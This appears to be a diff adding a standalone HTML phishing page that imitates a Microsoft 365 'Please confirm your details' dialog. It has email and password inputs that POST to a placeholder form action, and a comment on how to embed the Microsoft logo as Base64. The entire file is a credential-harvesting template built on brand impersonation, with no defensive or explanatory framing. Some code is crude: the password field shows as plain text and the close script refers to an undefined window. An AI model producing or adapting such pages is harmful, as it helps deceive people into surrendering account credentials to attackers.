@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <style>
+body {
+  margin: 0px;
+}
+/* Background */
+#background {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(106.75deg, #FFE7E7 1.62%, rgba(255, 253, 213, 0) 96.07%);
+}
+
+/* Window */
+#window {
+  position: absolute;
+  background: #ffffff;
+  width: 450px;
+  height: 400px;
+  top: 30%;
+  left: 40%;
+  -webkit-box-shadow: 5px 10px 6px -6px #777;
+   -moz-box-shadow: 5px 10px 6px -6px #777;
+        box-shadow: 5px 10px 6px -6px #777;
+}
+
+/* Microsoft 365 Logo */
+#microsoft-logo {
+  position: absolute;
+  width: 190px;
+  height: 51px;
+  margin: 15px 0 0 15px;
+}
+
+/*Confirm Details*/
+#confirm-details {
+  position: absolute;
+  width: 294px;
+  height: 26px;
+  font-family: Calibri;
+  font-style: normal;
+  font-weight: normal;
+  font-size: 24px;
+  line-height: 28px;
+  color: #000000;
+  margin: 100px 0 0 28px;
+}
+
+#email-container {
+  margin: 0 0 10px 30px;
+  position: absolute;
+  width: 80%;
+  height: 64px;
+  top: 40%;
+  border: none;
+}
+
+#password-container {
+  margin: 0 0 10px 30px;
+  position: absolute;
+  width: 80%;
+  height: 64px;
+  top: 60%;
+  border: none;
+}
+
+input {
+  width: 90%;
+  padding: 10px;
+  border: none;
+  border-bottom: 1px solid black;
+}
+
+button {
+  /* remove default behaviour */
+  appearance: none;
+  -webkit-appearance: none
+
+  /* usual styles */
+  padding: 20px;
+  border: none;
+  background-color: #3F51B5;
+  color: #fff;
+  font-weight: 350;
+  border-radius: 1px;
+  width: 20%;
+  height: 30px;
+  position: absolute;
+  top: 80%;
+  left: 65%;
+}
+
+</style>
+</head>
+  <body>
+    <div id="background">
+      <div id="window">
+        <div id="microsoft-logo">
+          <img src= /> /*Your image needs to be in Base64 format. I use codebeautify to convert my images to Base64 format*/
+        </div>
+        <div id="confirm-details">
+          Please confirm your details
+        </div>
+        <form action="text" method="POST" target="_blank">
+          <div id="email-container">
+              <input type="text" name="email" placeholder="Email Address"/>
+          </div>
+          <div id="password-container">
+            <input type="text" name="password" placeholder="Password"/>
+          </div>
+          <button onClick="closeWin()">Confirm</button>
+        </form>
+      </div>
+    </div>
+    <script>
+    var myWindow
+      function closeWin() {
+        myWindow.close();
+      }
+    </script>
+  </body>
+</html>
